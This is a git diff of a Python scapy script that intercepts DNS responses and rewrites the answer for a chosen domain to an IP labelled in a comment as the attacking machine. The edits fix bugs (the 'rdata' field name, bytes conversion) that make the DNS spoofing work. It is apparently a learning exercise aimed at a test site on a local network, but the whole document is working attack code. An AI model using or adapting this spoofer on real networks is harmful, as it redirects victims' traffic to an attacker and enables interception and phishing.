@@ -6,9 +6,9 @@ def process_packet(packet):
     scapy_packets = scapy.IP(packet.get_payload())
     if scapy_packets.haslayer(scapy.DNSRR):
         qname = scapy_packets[scapy.DNSQR].qname
-        if "www.bing.com" in qname:
+        if "www.vulnweb.com" in str(qname):
             print(f"[+] Spoofing target: ")
-            answer = scapy.DNSRR(rrname=qname, rdate="192.168.159.134")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.159.134")
             # modify the response packet
             # rrname = website to be visited, rdate = attacking machine IP
             scapy_packets[scapy.DNS].an = answer
@@ -19,8 +19,8 @@ def process_packet(packet):
             del scapy_packets[scapy.IP].chksum
             del scapy_packets[scapy.UDP].len
             del scapy_packets[scapy.UDP].chksum
-
-            packet.set_payload(str(scapy_packets))
+            # delete the chucksum and length to avoid packet mismatching
+            packet.set_payload(bytes(scapy_packets))
             # change the original packet to modified packet
     packet.accept()
     """
